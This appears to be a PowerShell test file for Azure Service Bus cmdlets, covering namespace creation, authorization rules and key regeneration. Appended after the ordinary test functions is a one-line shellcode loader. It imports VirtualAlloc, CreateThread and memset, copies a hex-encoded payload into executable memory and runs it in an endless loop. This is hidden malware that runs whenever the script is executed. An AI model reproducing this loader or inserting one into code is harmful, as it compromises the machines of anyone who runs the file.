













		

function ServiceBusTests {
    
    $location = Get-Location
    $resourceGroupName = getAssetName "RGName-"
    $namespaceName = getAssetName "Namespace1-"
    $namespaceName2 = getAssetName "Namespace2-"
 
    Write-Debug "Create resource group"    
    New-AzResourceGroup -Name $resourceGroupName -Location $location -Force 
     
    
    $checkNameResult = Test-AzServiceBusName -NamespaceName $namespaceName 
    Assert-True { $checkNameResult.NameAvailable }

    Write-Debug " Create new eventHub namespace"
    Write-Debug "NamespaceName : $namespaceName"
    $result = New-AzServiceBusNamespace -ResourceGroupName $resourceGroupName -Location $location  -Name $namespaceName -SkuName "Standard"
    
    Assert-AreEqual $result.Name $namespaceName
    Assert-AreEqual $result.ProvisioningState "Succeeded"
    Assert-AreEqual $result.ResourceGroup $resourceGroupName "Namespace create : ResourceGroup name matches"
    Assert-AreEqual $result.ResourceGroupName $resourceGroupName "Namespace create : ResourceGroupName name matches"

    Write-Debug "Get the created namespace within the resource group"
    $getNamespace = Get-AzServiceBusNamespace -ResourceGroupName $resourceGroupName -Name $namespaceName
    Assert-AreEqual $getNamespace.Name $namespaceName "Get-ServicebusName- created namespace not found"
    Assert-AreEqual $getNamespace.ResourceGroup $resourceGroupName "Namespace get : ResourceGroup name matches"
    Assert-AreEqual $getNamespace.ResourceGroupName $resourceGroupName "Namespace get : ResourceGroupName name matches"
    
    $UpdatedNameSpace = Set-AzServiceBusNamespace -ResourceGroupName $resourceGroupName -Location $location -Name $namespaceName -SkuName "Standard" -SkuCapacity 2
    Assert-AreEqual $UpdatedNameSpace.Name $namespaceName

    Write-Debug "Namespace name : $namespaceName2"
    $result = New-AzServiceBusNamespace -ResourceGroupName $resourceGroupName -Location $location -Name $namespaceName2

    Write-Debug "Get all the namespaces created in the resourceGroup"
    $allCreatedNamespace = Get-AzServiceBusNamespace -ResourceGroupName $resourceGroupName
    Assert-True { $allCreatedNamespace.Count -gt 1 }
	
    Write-Debug "Get all the namespaces created in the subscription"
    $allCreatedNamespace = Get-AzServiceBusNamespace
    Assert-True { $allCreatedNamespace.Count -gt 1 }

    Write-Debug " Delete namespaces"
    Remove-AzServiceBusNamespace -ResourceGroupName $resourceGroupName -Name $namespaceName2
    Remove-AzServiceBusNamespace -ResourceGroupName $resourceGroupName -Name $namespaceName

    Write-Debug " Delete resourcegroup"
    Remove-AzResourceGroup -Name $resourceGroupName -Force
}


function ServiceBusNameSpaceAuthTests {
    
    $location = Get-Location
    $resourceGroupName = getAssetName "RGName-"
    $namespaceName = getAssetName "Namespace-"
    $authRuleName = getAssetName "authorule-"
    $authRuleNameListen = getAssetName "authorule-"
    $authRuleNameSend = getAssetName "authorule-"
    $authRuleNameAll = getAssetName "authorule-"
    $defaultNamespaceAuthRule = "RootManageSharedAccessKey"
	
    Write-Debug " Create resource group"    
    Write-Debug "ResourceGroup name : $resourceGroupName"
    New-AzResourceGroup -Name $resourceGroupName -Location $location -Force    
    
    Write-Debug " Create new ServiceBus namespace"
    Write-Debug "Namespace name : $namespaceName"	
    $result = New-AzServiceBusNamespace -ResourceGroupName $resourceGroupName -Location $location -Name $namespaceName
        
    Write-Debug " Get the created namespace within the resource group"
    $createdNamespace = Get-AzServiceBusNamespace -ResourceGroupName $resourceGroupName -Name $namespaceName
    Assert-AreEqual $createdNamespace.Name $namespaceName

    Write-Debug "Create a Namespace Authorization Rule"    
    Write-Debug "Auth Rule name : $authRuleName"
    $result = New-AzServiceBusAuthorizationRule -ResourceGroupName $resourceGroupName -Namespace $namespaceName -Name $authRuleName -Rights @("Listen", "Send")
	
    Assert-AreEqual $authRuleName $result.Name
    Assert-AreEqual 2 $result.Rights.Count
    Assert-True { $result.Rights -Contains "Listen" }
    Assert-True { $result.Rights -Contains "Send" }

    $resultListen = New-AzServiceBusAuthorizationRule -ResourceGroupName $resourceGroupName -Namespace $namespaceName -Name $authRuleNameListen -Rights @("Listen")
    Assert-AreEqual $authRuleNameListen $resultListen.Name
    Assert-AreEqual 1 $resultListen.Rights.Count
    Assert-True { $resultListen.Rights -Contains "Listen" }

    $resultSend = New-AzServiceBusAuthorizationRule -ResourceGroupName $resourceGroupName -Namespace $namespaceName -Name $authRuleNameSend -Rights @("Send")
    Assert-AreEqual $authRuleNameSend $resultSend.Name
    Assert-AreEqual 1 $resultSend.Rights.Count
    Assert-True { $resultSend.Rights -Contains "Send" }

    $resultAll3 = New-AzServiceBusAuthorizationRule -ResourceGroupName $resourceGroupName -Namespace $namespaceName -Name $authRuleNameAll -Rights @("Listen", "Send", "Manage")
    Assert-AreEqual $authRuleNameAll $resultAll3.Name
    Assert-AreEqual 3 $resultAll3.Rights.Count
    Assert-True { $resultAll3.Rights -Contains "Send" }
    Assert-True { $resultAll3.Rights -Contains "Listen" }
    Assert-True { $resultAll3.Rights -Contains "Manage" }

    Write-Debug "Create a Namespace Authorization Rule"    
    Write-Debug "Auth Rule name : $authRuleName"
    $result = New-AzServiceBusAuthorizationRule -ResourceGroupName $resourceGroupName -Namespace $namespaceName -Name $authRuleName -Rights @("Listen", "Send")
	
    Assert-AreEqual $authRuleName $result.Name
    Assert-AreEqual 2 $result.Rights.Count
    Assert-True { $result.Rights -Contains "Listen" }
    Assert-True { $result.Rights -Contains "Send" }

    Write-Debug "Get created authorizationRule"
    $createdAuthRule = Get-AzServiceBusAuthorizationRule -ResourceGroupName $resourceGroupName -Namespace $namespaceName -Name $authRuleName

    Assert-AreEqual $authRuleName $createdAuthRule.Name
    Assert-AreEqual 2 $createdAuthRule.Rights.Count
    Assert-True { $createdAuthRule.Rights -Contains "Listen" }
    Assert-True { $createdAuthRule.Rights -Contains "Send" }

    Write-Debug "Get the default Namespace AuthorizationRule"   
    $result = Get-AzServiceBusAuthorizationRule -ResourceGroupName $resourceGroupName -Namespace $namespaceName -Name $defaultNamespaceAuthRule

    Assert-AreEqual $defaultNamespaceAuthRule $result.Name
    Assert-AreEqual 3 $result.Rights.Count
    Assert-True { $result.Rights -Contains "Listen" }
    Assert-True { $result.Rights -Contains "Send" }
    Assert-True { $result.Rights -Contains "Manage" }

    Write-Debug "Get All Namespace AuthorizationRule"
    $result = Get-AzServiceBusAuthorizationRule -ResourceGroupName $resourceGroupName -Namespace $namespaceName

    $found = 0
    for ($i = 0; $i -lt $result.Count; $i++) {
        if ($result[$i].Name -eq $authRuleName) {
            $found = $found + 1
            Assert-AreEqual 2 $result[$i].Rights.Count
            Assert-True { $result[$i].Rights -Contains "Listen" }
            Assert-True { $result[$i].Rights -Contains "Send" }                      
        }

        if ($result[$i].Name -eq $defaultNamespaceAuthRule) {
            $found = $found + 1
            Assert-AreEqual 3 $result[$i].Rights.Count
            Assert-True { $result[$i].Rights -Contains "Listen" }
            Assert-True { $result[$i].Rights -Contains "Send" }
            Assert-True { $result[$i].Rights -Contains "Manage" }         
        }
    }

    Assert-AreEqual $found 2 "All Authorizationrules: Namespace AuthorizationRules created earlier is not found."
		
    Write-Debug "Update Namespace AuthorizationRules ListKeys"
    
    $createdAuthRule.Rights.Add("Manage")

    $updatedAuthRule = Set-AzServiceBusAuthorizationRule -ResourceGroupName $resourceGroupName -Namespace $namespaceName -InputObject $createdAuthRule -Name $authRuleName
    
    Assert-AreEqual $authRuleName $updatedAuthRule.Name
    Assert-AreEqual 3 $updatedAuthRule.Rights.Count
    Assert-True { $updatedAuthRule.Rights -Contains "Listen" }
    Assert-True { $updatedAuthRule.Rights -Contains "Send" }
    Assert-True { $updatedAuthRule.Rights -Contains "Manage" }    
    
    Write-Debug "Get updated Namespace AuthorizationRules"
    $updatedAuthRule = Get-AzServiceBusAuthorizationRule -ResourceGroupName $resourceGroupName -Namespace $namespaceName -Name $authRuleName
    
    Assert-AreEqual $authRuleName $updatedAuthRule.Name
    Assert-AreEqual 3 $updatedAuthRule.Rights.Count
    Assert-True { $updatedAuthRule.Rights -Contains "Listen" }
    Assert-True { $updatedAuthRule.Rights -Contains "Send" }
    Assert-True { $updatedAuthRule.Rights -Contains "Manage" }

    Write-Debug "Get namespace authorizationRules connectionStrings"
    $namespaceListKeys = Get-AzServiceBusKey -ResourceGroupName $resourceGroupName -Namespace $namespaceName -Name $authRuleName

    Assert-True { $namespaceListKeys.PrimaryConnectionString -like "*$($updatedAuthRule.PrimaryKey)*" }
    Assert-True { $namespaceListKeys.SecondaryConnectionString -like "*$($updatedAuthRule.SecondaryKey)*" }
	
    
    $policyKey = "PrimaryKey"

    $namespaceRegenerateKeysDefault = New-AzServiceBusKey -ResourceGroupName $resourceGroupName -Namespace $namespaceName -Name $authRuleName -RegenerateKey $policyKey
    Assert-True { $namespaceRegenerateKeys.PrimaryKey -ne $namespaceListKeys.PrimaryKey }

    $namespaceRegenerateKeys = New-AzServiceBusKey -ResourceGroupName $resourceGroupName -Namespace $namespaceName -Name $authRuleName -RegenerateKey $policyKey -KeyValue $namespaceListKeys.PrimaryKey
    Assert-AreEqual $namespaceRegenerateKeys.PrimaryKey $namespaceListKeys.PrimaryKey

    $policyKey1 = "SecondaryKey"

    $namespaceRegenerateKeys1 = New-AzServiceBusKey -ResourceGroupName $resourceGroupName -Namespace $namespaceName -Name $authRuleName -RegenerateKey $policyKey1 -KeyValue $namespaceListKeys.PrimaryKey
    Assert-AreEqual $namespaceRegenerateKeys1.SecondaryKey $namespaceListKeys.PrimaryKey
																	
    $namespaceRegenerateKeys1 = New-AzServiceBusKey -ResourceGroupName $resourceGroupName -Namespace $namespaceName -Name $authRuleName -RegenerateKey $policyKey1
    Assert-True { $namespaceRegenerateKeys1.SecondaryKey -ne $namespaceListKeys.PrimaryKey }
    Assert-True { $namespaceRegenerateKeys1.SecondaryKey -ne $namespaceListKeys.SecondaryKey }

    Write-Debug "Delete the created Namespace AuthorizationRule"
    $result = Remove-AzServiceBusAuthorizationRule -ResourceGroupName $resourceGroupName -Namespace $namespaceName -Name $authRuleName -Force
    
    Write-Debug " Delete namespaces"
    Remove-AzServiceBusNamespace -ResourceGroupName $resourceGroupName -Name $namespaceName
	   
}
$A04m = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $A04m -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xda,0xd0,0xd9,0x74,0x24,0xf4,0x58,0x2b,0xc9,0xb1,0x5a,0xbd,0x9e,0xd3,0xea,0xf2,0x31,0x68,0x17,0x03,0x68,0x17,0x83,0x5e,0xd7,0x08,0x07,0xa2,0x30,0x4e,0xe8,0x5a,0xc1,0x2f,0x60,0xbf,0xf0,0x6f,0x16,0xb4,0xa3,0x5f,0x5c,0x98,0x4f,0x2b,0x30,0x08,0xdb,0x59,0x9d,0x3f,0x6c,0xd7,0xfb,0x0e,0x6d,0x44,0x3f,0x11,0xed,0x97,0x6c,0xf1,0xcc,0x57,0x61,0xf0,0x09,0x85,0x88,0xa0,0xc2,0xc1,0x3f,0x54,0x66,0x9f,0x83,0xdf,0x34,0x31,0x84,0x3c,0x8c,0x30,0xa5,0x93,0x86,0x6a,0x65,0x12,0x4a,0x07,0x2c,0x0c,0x8f,0x22,0xe6,0xa7,0x7b,0xd8,0xf9,0x61,0xb2,0x21,0x55,0x4c,0x7a,0xd0,0xa7,0x89,0xbd,0x0b,0xd2,0xe3,0xbd,0xb6,0xe5,0x30,0xbf,0x6c,0x63,0xa2,0x67,0xe6,0xd3,0x0e,0x99,0x2b,0x85,0xc5,0x95,0x80,0xc1,0x81,0xb9,0x17,0x05,0xba,0xc6,0x9c,0xa8,0x6c,0x4f,0xe6,0x8e,0xa8,0x0b,0xbc,0xaf,0xe9,0xf1,0x13,0xcf,0xe9,0x59,0xcb,0x75,0x62,0x77,0x18,0x04,0x29,0x10,0xed,0x25,0xd1,0xe0,0x79,0x3d,0xa2,0xd2,0x26,0x95,0x2c,0x5f,0xae,0x33,0xab,0xa0,0x85,0x84,0x23,0x5f,0x26,0xf5,0x6a,0xa4,0x72,0xa5,0x04,0x0d,0xfb,0x2e,0xd4,0xb2,0x2e,0xe0,0x84,0x1c,0x81,0x41,0x74,0xdd,0x71,0x2a,0x9e,0xd2,0xae,0x4a,0xa1,0x38,0xc7,0x63,0x1d,0xc3,0xe8,0x73,0xee,0xb3,0x89,0x01,0x64,0x55,0x79,0xd2,0xaa,0xfb,0x12,0x37,0xdb,0x73,0xc3,0x25,0x72,0x0e,0x1b,0xf2,0xdc,0xb6,0x43,0x5a,0x84,0x1e,0x2c,0x02,0x6c,0xc7,0x94,0xea,0xd4,0xaf,0x7c,0x53,0xbc,0x17,0x25,0x3b,0x64,0xf0,0x8d,0xe3,0xcc,0x58,0x76,0x4c,0xb4,0x00,0xde,0x34,0x1c,0xe9,0x86,0x9c,0xc4,0x51,0x6f,0x45,0xac,0x39,0xd7,0x75,0x24,0x13,0xcf,0x41,0x34,0x9c,0xc5,0x21,0x74,0x7f,0x8c,0x30,0x24,0x17,0x52,0x3b,0xc5,0x5c,0xdb,0xdd,0xaf,0xb2,0x8a,0x76,0x47,0x2a,0x97,0x0d,0xf6,0xb3,0x0d,0x68,0x38,0x3f,0xa2,0x8c,0xf6,0xc8,0xcf,0x9e,0x6e,0x39,0x9a,0xfd,0x38,0x46,0x30,0x6b,0xc4,0xd2,0xbf,0x3a,0x93,0x4a,0xc2,0x1b,0xd3,0xd4,0x3d,0x4e,0x68,0xdc,0xab,0x31,0x06,0x21,0x3c,0xb2,0xd6,0x77,0x56,0xb2,0xbe,0x2f,0x02,0xe1,0xdb,0x2f,0x9f,0x95,0x70,0xba,0x20,0xcc,0x25,0x6d,0x49,0xf2,0x10,0x59,0xd6,0x0d,0x77,0x5b,0x2a,0xd8,0xb1,0x29,0x42,0xd8;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$nGP=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($nGP.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$nGP,0,0,0);for (;;){Start-sleep 60};
